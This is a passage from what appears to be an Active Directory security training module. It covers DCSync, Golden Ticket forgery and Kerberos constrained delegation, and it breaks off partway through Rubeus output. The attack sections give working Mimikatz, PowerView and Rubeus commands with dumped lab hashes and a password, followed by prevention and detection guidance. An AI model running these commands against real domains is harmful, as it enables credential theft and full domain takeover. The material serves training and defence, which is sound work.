Attempting to start <span class="hljs-keyword">cmd</span>.<span class="bash">exe as user <span class="hljs-string">"eagle\rocky"</span> ...</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A7/Rockyprompt.png" alt="Creds in Description"></p>
<p>Subsequently, we need to use <code>Mimikatz</code>, one of the tools with an implementation for performing DCSync. We can run it by specifying the username whose password hash we want to obtain if the attack is successful, in this case, the user &#39;Administrator&#39;:</p>
<p>DCSync</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\Mimikatz&gt;mimikatz.exe

mimikatz # <span class="hljs-attribute">lsadump</span>::dcsync /<span class="hljs-attribute">domain</span>:eagle.local /<span class="hljs-attribute">user</span>:Administrator

[DC] <span class="hljs-string">'eagle.local'</span> will be the domain
[DC] <span class="hljs-string">'DC2.eagle.local'</span> will be the DC server
[DC] <span class="hljs-string">'Administrator'</span> will be the user account
[rpc] <span class="hljs-attribute">Service  </span>: ldap
[rpc] <span class="hljs-attribute">AuthnSvc </span>: GSS_NEGOTIATE (<span class="hljs-number">9</span>)

Object <span class="hljs-attribute">RDN           </span>: Administrator

** SAM ACCOUNT **

SAM <span class="hljs-attribute">Username         </span>: Administrator
Account <span class="hljs-attribute">Type         </span>: <span class="hljs-number">30000000</span> ( USER_OBJECT )
User Account <span class="hljs-attribute">Control </span>: <span class="hljs-number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account <span class="hljs-attribute">expiration   </span>:
Password last <span class="hljs-attribute">change </span>: <span class="hljs-number">07</span>/<span class="hljs-number">08</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11.24</span>.<span class="hljs-number">13</span>
Object Security <span class="hljs-attribute">ID   </span>: S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1518138621</span>-<span class="hljs-number">4282902758</span>-<span class="hljs-number">752445584</span>-<span class="hljs-number">500</span>
Object Relative <span class="hljs-attribute">ID   </span>: <span class="hljs-number">500</span>

<span class="hljs-attribute">Credentials</span>:
  Hash <span class="hljs-attribute">NTLM</span>: fcdc65703dd2b0bd789977f1f3eeaecf

Supplemental <span class="hljs-attribute">Credentials</span>:
* <span class="hljs-attribute">Primary</span>:NTLM-Strong-NTOWF *
    Random <span class="hljs-attribute">Value </span>: <span class="hljs-number">6</span>fd69313922373216cdbbfa823bd268d

* <span class="hljs-attribute">Primary</span>:Kerberos-Newer-Keys *
    Default <span class="hljs-attribute">Salt </span>: WIN-FM93RI8QOKQAdministrator
    Default <span class="hljs-attribute">Iterations </span>: <span class="hljs-number">4096</span>
    Credentials
      aes256_hmac       (<span class="hljs-number">4096</span>) : <span class="hljs-number">1</span>c4197df604e4da0ac46164b30e431405d23128fb37514595555cca76583cfd3
      aes128_hmac       (<span class="hljs-number">4096</span>) : <span class="hljs-number">4667</span>ae9266d48c01956ab9c869e4370f
      des_cbc_md5       (<span class="hljs-number">4096</span>) : d9b53b1f6d7c45a8

* Packages *
    NTLM-Strong-NTOWF

* <span class="hljs-attribute">Primary</span>:Kerberos *
    Default <span class="hljs-attribute">Salt </span>: WIN-FM93RI8QOKQAdministrator
    Credentials
      <span class="hljs-attribute">des_cbc_md5       </span>: d9b53b1f6d7c45a8
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A7/AdminHash.png" alt="Creds in Description"></p>
<p>It is possible to specify the <code>/all</code> parameter instead of a specific username, which will dump the hashes of the entire AD environment. We can perform <code>pass-the-hash</code> with the obtained hash and authenticate against any Domain Controller.</p>
<hr>
<h3 id="prevention">Prevention</h3>
<p>What DCSync abuses is a common operation in Active Directory environments, as replications happen between Domain Controllers all the time; therefore, preventing DCSync out of the box is not an option. The only prevention technique against this attack is using solutions such as the <a href="https://github.com/zeronetworks/rpcfirewall">RPC Firewall</a>, a third-party product that can block or allow specific RPC calls with robust granularity. For example, using <code>RPC Firewall</code>, we can only allow replications from Domain Controllers.</p>
<hr>
<h3 id="detection">Detection</h3>
<p>Detecting DCSync is easy because each Domain Controller replication generates an event with the ID <code>4662</code>. We can pick up abnormal requests immediately by monitoring for this event ID and checking whether the initiator account is a Domain Controller. Here&#39;s the event generated from earlier when we ran <code>Mimikatz</code>; it serves as a flag that a user account is performing this replication attempt:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A7/DetectDCSync.png" alt="Creds in Description"></p>
<p>Since replications occur constantly, we can avoid false positives by ensuring the followings:</p>
<ul>
<li>Either the property <code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code> or <code>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</code> is <a href="https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb">present in the event</a>.</li>
<li>Whitelisting systems/accounts with a (valid) business reason for replicating, such as <code>Azure AD Connect</code> (this service constantly replicates Domain Controllers and sends the obtained password hashes to Azure AD).</li>
</ul>
<h2 id="golden-ticket">Golden Ticket</h2>
<hr>
<h3 id="description">Description</h3>
<p>The <code>Kerberos Golden Ticket</code> is an attack in which threat agents can create/generate tickets for any user in the Domain, therefore effectively acting as a Domain Controller.</p>
<p>When a Domain is created, the unique user account <code>krbtgt</code> is created by default; <code>krbtgt</code> is a disabled account that cannot be deleted, renamed, or enabled. The Domain Controller&#39;s KDC service will use the password of <code>krbtgt</code> to derive a key with which it signs all Kerberos tickets. This password&#39;s hash is the most trusted object in the entire Domain because it is how objects guarantee that the environment&#39;s Domain issued Kerberos tickets.</p>
<p>Therefore, <code>any user</code> possessing the password&#39;s hash of <code>krbtgt</code> can create valid Kerberos TGTs. Because <code>krbtgt</code> signs them, forged TGTs are considered valid tickets within an environment. Previously, it was even possible to create TGTs for inexistent users and assign any privileges to their accounts. Because the password&#39;s hash of <code>krbtgt</code> signs these tickets, the entire domain blindly trusts them, behaving as if the user(s) existed and possessed the privileges inscribed in the ticket.</p>
<p>The <code>Golden Ticket</code> attack allows us to escalate rights from any child domain to the parent in the same forest. Therefore, we can escalate to the production domain from any test domain we may have, as the domain is <code>not</code> a security boundary.</p>
<p>This attack provides means for elevated persistence in the domain. It occurs after an adversary has gained Domain Admin (or similar) privileges.</p>
<hr>
<h3 id="attack">Attack</h3>
<p>To perform the <code>Golden Ticket</code> attack, we can use <code>Mimikatz</code> with the following arguments:</p>
<ul>
<li><code>/domain</code>: The domain&#39;s name.</li>
<li><code>/sid</code>: The domain&#39;s SID value.</li>
<li><code>/rc4</code>: The password&#39;s hash of <code>krbtgt</code>.</li>
<li><code>/user</code>: The username for which <code>Mimikatz</code> will issue the ticket (Windows 2019 blocks tickets if they are for inexistent users.)</li>
<li><code>/id</code>: Relative ID (last part of <code>SID</code>) for the user for whom <code>Mimikatz</code> will issue the ticket.</li>
</ul>
<p>Additionally, advanced threat agents mostly will specify values for the <code>/renewmax</code> and <code>/endin</code> arguments, as otherwise, <code>Mimikatz</code> will generate the ticket(s) with a lifetime of 10 years, making it very easy to detect by EDRs:</p>
<ul>
<li><code>/renewmax</code>: The maximum number of days the ticket can be renewed.</li>
<li><code>/endin</code>: End-of-life for the ticket.</li>
</ul>
<p>First, we need to obtain the password&#39;s hash of <code>krbtgt</code> and the <code>SID</code> value of the Domain. We can utilize <code>DCSync</code> with Rocky&#39;s account from the previous attack to obtain the hash:</p>
<p>Golden Ticket</p>
<pre><code class="lang-cmd-session">C:\WINDOWS\system32&gt;cd ../../../

C:\&gt;cd Mimikatz

C:\Mimikatz&gt;mimikatz.exe

  .<span class="hljs-comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span>
 .<span class="hljs-comment">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span>
 <span class="hljs-comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
 <span class="hljs-comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
 '<span class="hljs-comment">## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span>
  '<span class="hljs-comment">#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span>

mimikatz <span class="hljs-comment"># lsadump::dcsync /domain:eagle.local /user:krbtgt</span>
[DC] 'eagle.local' will be the domain
[DC] 'DC1.eagle.local' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         :<span class="hljs-number"> 30000000 </span>( USER_OBJECT )
User Account Control :<span class="hljs-number"> 00000202 </span>( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 07/08/2022 11.26.54
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: db0d0630064747072a7da3f7c3b4069e
    ntlm- 0: db0d0630064747072a7da3f7c3b4069e
    lm  - 0: f298134aa1b3627f4b162df101be7ef9

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b21cfadaca7a3ab774f0b4aea0d7797f

* Primary:Kerberos-Newer-Keys *
    Default Salt : EAGLE.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc
      aes128_hmac       (4096) : 8ca6bbd37b3bfb692a3cfaf68c579e64
      des_cbc_md5       (4096) : 580229010b15b52f

* Primary:Kerberos *
    Default Salt : EAGLE.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 580229010b15b52f

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
   <span class="hljs-number"> 01 </span> b4799f361e20c69c6fc83b9253553f3f
   <span class="hljs-number"> 02 </span> 510680d277587431b476c35e5f56e6b6
   <span class="hljs-number"> 03 </span> 7f55d426cc922e24269610612c9205aa
   <span class="hljs-number"> 04 </span> b4799f361e20c69c6fc83b9253553f3f
   <span class="hljs-number"> 05 </span> 510680d277587431b476c35e5f56e6b6
   <span class="hljs-number"> 06 </span> 5fe31b1339791ab90043dbcbdf2fba02
   <span class="hljs-number"> 07 </span> b4799f361e20c69c6fc83b9253553f3f
   <span class="hljs-number"> 08 </span> 7e08c14bc481e738910ba4d43b96803b
   <span class="hljs-number"> 09 </span> 7e08c14bc481e738910ba4d43b96803b
   <span class="hljs-number"> 10 </span> b06fca48286ef6b1f6fb05f08248e6d7
   <span class="hljs-number"> 11 </span> 20f1565a063bb0d0ef7c819fa52f4fae
   <span class="hljs-number"> 12 </span> 7e08c14bc481e738910ba4d43b96803b
   <span class="hljs-number"> 13 </span> b5181b744e0e9f7cc03435c069003e96
   <span class="hljs-number"> 14 </span> 20f1565a063bb0d0ef7c819fa52f4fae
   <span class="hljs-number"> 15 </span> 1aef9b5b268b8922a1e5cc11ed0c53f6
   <span class="hljs-number"> 16 </span> 1aef9b5b268b8922a1e5cc11ed0c53f6
   <span class="hljs-number"> 17 </span> cd03f233b0aa1b39689e60dd4dbf6832
   <span class="hljs-number"> 18 </span> ab6be1b7fd2ce7d8267943c464ee0673
   <span class="hljs-number"> 19 </span> 1c3610dce7d73451d535a065fc7cc730
   <span class="hljs-number"> 20 </span> aeb364654402f52deb0b09f7e3fad531
   <span class="hljs-number"> 21 </span> c177101f066186f80a5c3c97069ef845
   <span class="hljs-number"> 22 </span> c177101f066186f80a5c3c97069ef845
   <span class="hljs-number"> 23 </span> 2f61531cee8cab3bb561b1bb4699cb9b
   <span class="hljs-number"> 24 </span> bc35f896383f7c4366a5ce5cf3339856
   <span class="hljs-number"> 25 </span> bc35f896383f7c4366a5ce5cf3339856
   <span class="hljs-number"> 26 </span> b554ba9e2ce654832edf7a26cc24b22d
   <span class="hljs-number"> 27 </span> f9daef80f97eead7b10d973f31c9caf4
   <span class="hljs-number"> 28 </span> 1cf0b20c5df52489f57e295e51034e97
   <span class="hljs-number"> 29 </span> 8c6049c719db31542c759b59bc671b9c
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A8/krbtgt.png" alt="krbtgt hash"></p>
<p>We will use the <code>Get-DomainSID</code> function from <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a> to obtain the SID value of the Domain:</p>
<p>Golden Ticket</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\b</span>ob<span class="hljs-symbol">\D</span>ownloads&gt; powershell -exec bypass

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\b</span>ob<span class="hljs-symbol">\D</span>ownloads&gt; . .<span class="hljs-symbol">\P</span>owerView.ps1
PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\b</span>ob<span class="hljs-symbol">\D</span>ownloads&gt; Get-DomainSID
S-1-5-21-1518138621-4282902758-752445584
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A8/sid.png" alt="SID"></p>
<p>Now, armed with all the required information, we can use <code>Mimikatz</code> to create a ticket for the account <code>Administrator</code>. The <code>/ptt</code> argument makes <code>Mimikatz</code> <a href="https://adsecurity.org/?page\_id=1821#KERBEROSPTT">pass the ticket into the current session</a>:</p>
<p>Golden Ticket</p>
<pre><code class="lang-cmd-session">C:\Mimikatz&gt;mimikatz.exe

  .#####.   mimikatz <span class="hljs-number">2.2</span><span class="hljs-number">.0</span> (x64) #<span class="hljs-number">19041</span> Aug <span class="hljs-number">10</span> <span class="hljs-number">2021</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">53</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  <span class="hljs-comment">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span>

mimikatz # kerberos::golden /domain:eagle.local /sid:S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1518138621</span><span class="hljs-number">-4282902758</span><span class="hljs-number">-752445584</span> /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:<span class="hljs-number">500</span> /renewmax:<span class="hljs-number">7</span> /endin:<span class="hljs-number">8</span> /ptt

User      : Administrator
Domain    : eagle.local (EAGLE)
SID       : S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1518138621</span><span class="hljs-number">-4282902758</span><span class="hljs-number">-752445584</span>
User Id   : <span class="hljs-number">500</span>
Groups Id : *<span class="hljs-number">513</span> <span class="hljs-number">512</span> <span class="hljs-number">520</span> <span class="hljs-number">518</span> <span class="hljs-number">519</span>
ServiceKey: db0d0630064747072a7da3f7c3b4069e - rc4_hmac_nt
Lifetime  : <span class="hljs-number">13</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2022</span> <span class="hljs-number">06.28</span><span class="hljs-number">.43</span> ; <span class="hljs-number">13</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2022</span> <span class="hljs-number">06.36</span><span class="hljs-number">.43</span> ; <span class="hljs-number">13</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2022</span> <span class="hljs-number">06.35</span><span class="hljs-number">.43</span>
-&gt; Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for <span class="hljs-string">'Administrator @ eagle.local'</span> successfully submitted for current session
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A8/kerbTicket.png" alt="Golden Ticket"></p>
<p>The output shows that <code>Mimikatz</code> injected the ticket in the current session, and we can verify that by running the command <code>klist</code> (after exiting from <code>Mimikatz</code>):</p>
<p>Golden Ticket</p>
<pre><code class="lang-cmd-session">mimikatz # <span class="hljs-keyword">exit</span>

Bye!

C:\Mimikatz&gt;klist

Current LogonId <span class="hljs-keyword">is</span> <span class="hljs-number">0</span>:<span class="hljs-number">0</span>x9cbd6

Cached Tickets: (<span class="hljs-number">1</span>)

<span class="hljs-string">#0</span>&gt;     Client: Administrator @ eagle.<span class="hljs-keyword">local</span>
        Server: krbtgt/eagle.<span class="hljs-keyword">local</span> @ eagle.<span class="hljs-keyword">local</span>
        KerbTicket Encryption <span class="hljs-keyword">Type</span>: RSADSI RC4-HMAC(NT)
        Ticket Flags <span class="hljs-number">0</span>x40e00000 -&gt; forwardable renewable initial pre_authent
        Start Time: <span class="hljs-number">10</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span> <span class="hljs-number">13</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2022</span> <span class="hljs-number">06.28</span>.<span class="hljs-number">43</span> (<span class="hljs-keyword">local</span>)
        <span class="hljs-keyword">End</span> Time:   <span class="hljs-number">10</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span> <span class="hljs-number">13</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2022</span> <span class="hljs-number">06.36</span>.<span class="hljs-number">43</span> (<span class="hljs-keyword">local</span>)
        Renew Time: <span class="hljs-number">10</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span> <span class="hljs-number">13</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2022</span> <span class="hljs-number">06.35</span>.<span class="hljs-number">43</span> (<span class="hljs-keyword">local</span>)
        Session Key <span class="hljs-keyword">Type</span>: RSADSI RC4-HMAC(NT)
        Cache Flags: <span class="hljs-number">0</span>x1 -&gt; PRIMARY
        Kdc Called:
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A8/injectedTicket.png" alt="Golden Ticket"></p>
<p>To verify that the ticket is working, we can list the content of the <code>C$</code> share of <code>DC1</code> using it:</p>
<p>Golden Ticket</p>
<pre><code class="lang-cmd-session">C:\Mimikatz&gt;<span class="hljs-keyword">dir</span> \\dc1\c$

 Volume <span class="hljs-keyword">in</span> drive \\dc1\c$ has <span class="hljs-keyword">no</span> <span class="hljs-keyword">label</span>.
 Volume Serial Number is 2CD0-9665

 Directory of \\dc1\c$

15/10/2022  08.30    &lt;<span class="hljs-keyword">DIR</span>&gt;          DFSReports
13/10/2022  13.23    &lt;<span class="hljs-keyword">DIR</span>&gt;          Mimikatz
01/09/2022  11.49    &lt;<span class="hljs-keyword">DIR</span>&gt;          PerfLogs
28/11/2022  01.59    &lt;<span class="hljs-keyword">DIR</span>&gt;          <span class="hljs-keyword">Program</span> Files
01/09/2022  04.02    &lt;<span class="hljs-keyword">DIR</span>&gt;          <span class="hljs-keyword">Program</span> Files (x86)
13/12/2022  02.22    &lt;<span class="hljs-keyword">DIR</span>&gt;          scripts
07/08/2022  11.31    &lt;<span class="hljs-keyword">DIR</span>&gt;          Users
28/11/2022  02.27    &lt;<span class="hljs-keyword">DIR</span>&gt;          Windows
               0 <span class="hljs-keyword">File</span>(s)              0 bytes
               8 <span class="hljs-keyword">Dir</span>(s)  44.947.984.384 bytes free
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A8/listDC1.png" alt="Golden Ticket"></p>
<hr>
<h3 id="prevention">Prevention</h3>
<p>Preventing the creation of forged tickets is difficult as the <code>KDC</code> generates valid tickets using the same procedure. Therefore, once an attacker has all the required information, they can forge a ticket. Nonetheless, there are a few things we can and should do:</p>
<ul>
<li>Block privileged users from authenticating to any device.</li>
<li>Periodically reset the password of the <code>krbtgt</code> account; the secrecy of this hash value is crucial to Active Directory. When resetting the password of <code>krbtgt</code> (regardless of the password&#39;s strength), it will always be overwritten with a new randomly generated and cryptographically secure one. Utilizing Microsoft&#39;s script for changing the password of <code>krbtgt</code> <a href="https://github.com/microsoft/New-KrbtgtKeys.ps1">KrbtgtKeys.ps1</a> is highly recommended as it has an audit mode that checks the domain for preventing impacts upon password change. It also forces DC replication across the globe so all Domain Controllers sync the new value instantly, reducing potential business disruptions.</li>
<li>Enforce <code>SIDHistory</code> filtering between the domains in forests to prevent the escalation from a child domain to a parent domain (because the escalation path involves abusing the <code>SIDHistory</code> property by setting it to that of a privileged group, for example, <code>Enterprise Admins</code>). However, doing this may result in potential issues in migrating domains.</li>
</ul>
<hr>
<h3 id="detection">Detection</h3>
<p>Correlating users&#39; behavior is the best technique to detect abuse of forged tickets. Suppose we know the location and time a user regularly uses to log in. In that case, it will be easy to alert on other (suspicious) behaviors—for example, consider the account &#39;Administrator&#39; in the attack described above. If a mature organization uses <code>Privileged Access Workstations</code> (<code>PAWs</code>), they should be alert to any privileged users not authenticating from those machines, proactively monitoring events with the ID <code>4624</code> and <code>4625</code> (successful and failed logon).</p>
<p>Domain Controllers will not log events when a threat agent forges a <code>Golden Ticket</code> from a compromised machine. However, when attempting to access another system(s), we will see events for successful logon originating from the compromised machine:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A8/logonAfterTickets.png" alt="Golden Ticket Logon"></p>
<p>Another detection point could be a TGS service requested for a user without a previous TGT. However, this can be a tedious task due to the sheer volume of tickets (and many other factors). If we go back to the attack scenario, by running <code>dir \\dc1\c$</code> at the end, we generated two TGS tickets on the Domain Controller:</p>
<h3 id="ticket-1-">Ticket 1:</h3>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A8/ticket1.png" alt="Golden Ticket TGS1"></p>
<h3 id="ticket-2-">Ticket 2:</h3>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A8/ticket2.png" alt="Golden Ticket TGS1"></p>
<p>The only difference between the tickets is the service. However, they are ordinary compared to the same events not associated with the <code>Golden Ticket</code>.</p>
<p>If <code>SID filtering</code> is enabled, we will get alerts with the event ID <code>4675</code> during cross-domain escalation.</p>
<hr>
<h3 id="note">Note</h3>
<p>If an Active Directory forest has been compromised, we need to reset all users&#39; passwords and revoke all certificates, and for <code>krbtgt</code>, we must reset its password twice (in <code>every domain</code>). The password history value for the <code>krbtgt</code> account is 2. Therefore it stores the two most recent passwords. By resetting the password twice, we effectively clear any old passwords from the history, so there is no way another DC will replicate this DC by using an old password. However, it is recommended that this password reset occur at least 10 hours apart from each other (maximum user ticket lifetime); otherwise, expect some services to break if done in a shorter period.</p>
<h2 id="kerberos-constrained-delegation">Kerberos Constrained Delegation</h2>
<hr>
<h3 id="description">Description</h3>
<p><code>Kerberos Delegation</code> enables an application to access resources hosted on a different server; for example, instead of giving the service account running the web server access to the database directly, we can allow the account to be delegated to the SQL server service. Once a user logs into the website, the web server service account will request access to the SQL server service on behalf of that user, allowing the user to get access to the content in the database that they’ve been provisioned to without having to assign any access to the web server service account itself.</p>
<p>We can configure three types of delegations in Active Directory:</p>
<ul>
<li><code>Unconstrained Delegation</code> (most permissive/broad)</li>
<li><code>Constrained Delegation</code></li>
<li><code>Resource-based Delegation</code></li>
</ul>
<p>Knowing and understanding that <code>any</code> type of delegation is a possible security risk is paramount, and we should avoid it unless necessary.</p>
<p>As the name suggests, <code>unconstrained delegation</code> is the most permissive, allowing an account to delegate to any service. In <code>constrained delegation</code>, a user account will have its properties configured to specify which service(s) they can delegate. For <code>resource-based delegation</code>, the configuration is within the computer object to whom delegation occurs. In that case, the computer is configured as <code>I trust only this/these accounts</code>. It is rare to see <code>Resource-based delegation</code> configured by an Administrator in production environments ( threat agents often abuse it to compromise devices). However, <code>Unconstrained</code> and <code>Constrained</code> delegations are commonly encountered in production environments.</p>
<hr>
<h3 id="attack">Attack</h3>
<p>We will only showcase the abuse of <code>constrained delegation</code>; when an account is trusted for delegation, the account sends a request to the <code>KDC</code> stating, &quot;Give me a Kerberos ticket for user YYYY because I am trusted to delegate this user to service ZZZZ&quot;, and a Kerberos ticket is generated for user YYYY (without supplying the password of user YYYY). It is also possible to delegate to another service, even if not configured in the user properties. For example, if we are trusted to delegate for <code>LDAP</code>, we can perform protocol transition and be entrusted to any other service such as <code>CIFS</code> or <code>HTTP</code>.</p>
<p>To demonstrate the attack, we assume that the user <code>web_service</code> is trusted for delegation and has been compromised. The password of this account is <code>Slavi123</code>. To begin, we will use the <code>Get-NetUser</code> function from <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a> to enumerate user accounts that are trusted for constrained delegation in the domain:</p>
<p>Kerberos Constrained Delegation</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\Users\bob\Downloads&gt; Get-NetUser -TrustedToAuth

<span class="hljs-string">logoncount                    :</span> <span class="hljs-number">23</span>
<span class="hljs-string">badpasswordtime               :</span> <span class="hljs-number">12</span><span class="hljs-regexp">/31/</span><span class="hljs-number">1601</span> <span class="hljs-number">4</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> PM
<span class="hljs-string">distinguishedname             :</span> CN=web service,CN=Users,DC=eagle,DC=local
<span class="hljs-string">objectclass                   :</span> {top, person, organizationalPerson, user}
<span class="hljs-string">displayname                   :</span> web service
<span class="hljs-string">lastlogontimestamp            :</span> <span class="hljs-number">10</span><span class="hljs-regexp">/13/</span><span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">12</span>:<span class="hljs-number">22</span> PM
<span class="hljs-string">userprincipalname             :</span> webservice<span class="hljs-meta">@eagle</span>.local
<span class="hljs-string">name                          :</span> web service
<span class="hljs-string">objectsid                     :</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1518138621</span><span class="hljs-number">-4282902758</span><span class="hljs-number">-752445584</span><span class="hljs-number">-2110</span>
<span class="hljs-string">samaccountname                :</span> webservice
<span class="hljs-string">codepage                      :</span> <span class="hljs-number">0</span>
<span class="hljs-string">samaccounttype                :</span> USER_OBJECT
<span class="hljs-string">accountexpires                :</span> NEVER
<span class="hljs-string">countrycode                   :</span> <span class="hljs-number">0</span>
<span class="hljs-string">whenchanged                   :</span> <span class="hljs-number">10</span><span class="hljs-regexp">/13/</span><span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">53</span>:<span class="hljs-number">09</span> PM
<span class="hljs-string">instancetype                  :</span> <span class="hljs-number">4</span>
<span class="hljs-string">usncreated                    :</span> <span class="hljs-number">135866</span>
<span class="hljs-string">objectguid                    :</span> b89f0cea<span class="hljs-number">-4</span>c1a<span class="hljs-number">-4e92</span>-ac42-f70b5ec432ff
<span class="hljs-string">lastlogoff                    :</span> <span class="hljs-number">1</span><span class="hljs-regexp">/1/</span><span class="hljs-number">1600</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM
msds-<span class="hljs-string">allowedtodelegateto      :</span> {http<span class="hljs-regexp">/DC1.eagle.local/</span>eagle.local, http<span class="hljs-regexp">/DC1.eagle.local, http/</span>DC1,
                                http<span class="hljs-regexp">/DC1.eagle.local/</span>EAGLE...}
<span class="hljs-string">objectcategory                :</span> CN=Person,CN=Schema,CN=Configuration,DC=eagle,DC=local
<span class="hljs-string">dscorepropagationdata         :</span> <span class="hljs-number">1</span><span class="hljs-regexp">/1/</span><span class="hljs-number">1601</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM
<span class="hljs-string">serviceprincipalname          :</span> {cvs<span class="hljs-regexp">/dc1.eagle.local, cvs/</span>dc1}
<span class="hljs-string">givenname                     :</span> web service
<span class="hljs-string">lastlogon                     :</span> <span class="hljs-number">10</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">31</span>:<span class="hljs-number">39</span> PM
<span class="hljs-string">badpwdcount                   :</span> <span class="hljs-number">0</span>
<span class="hljs-string">cn                            :</span> web service
<span class="hljs-string">useraccountcontrol            :</span> NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION
<span class="hljs-string">whencreated                   :</span> <span class="hljs-number">10</span><span class="hljs-regexp">/13/</span><span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">32</span>:<span class="hljs-number">35</span> PM
<span class="hljs-string">primarygroupid                :</span> <span class="hljs-number">513</span>
<span class="hljs-string">pwdlastset                    :</span> <span class="hljs-number">10</span><span class="hljs-regexp">/13/</span><span class="hljs-number">2022</span> <span class="hljs-number">10</span>:<span class="hljs-number">36</span>:<span class="hljs-number">04</span> PM
msds-<span class="hljs-string">supportedencryptiontypes :</span> <span class="hljs-number">0</span>
<span class="hljs-string">usnchanged                    :</span> <span class="hljs-number">143463</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/176/A9/ConsDelegation.png" alt="Get Trusted for Authentication"></p>
<p>We can see that the user <code>web_service</code> is configured for delegating the HTTP service to the Domain Controller <code>DC1</code>. The HTTP service provides the ability to execute <code>PowerShell Remoting</code>. Therefore, any threat actor gaining control over <code>web_service</code> can request a Kerberos ticket for any user in Active Directory and use it to connect to <code>DC1</code> over <code>PowerShell Remoting</code>.</p>
<p>Before we request a ticket with <code>Rubeus</code> (which expects a password hash instead of cleartext for the <code>/rc4</code> argument used subsequently), we need to use it to convert the plaintext password <code>Slavi123</code> into its <code>NTLM</code> hash equivalent:</p>
<p>Kerberos Constrained Delegation</p>
<pre><code class="lang-powershell-session">PS C:\Users\bob\Downloads&gt; .\Rubeus.exe hash /password:Slavi123

   ______        _
  (_____ \      |<span class="hljs-string"> </span>|
   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
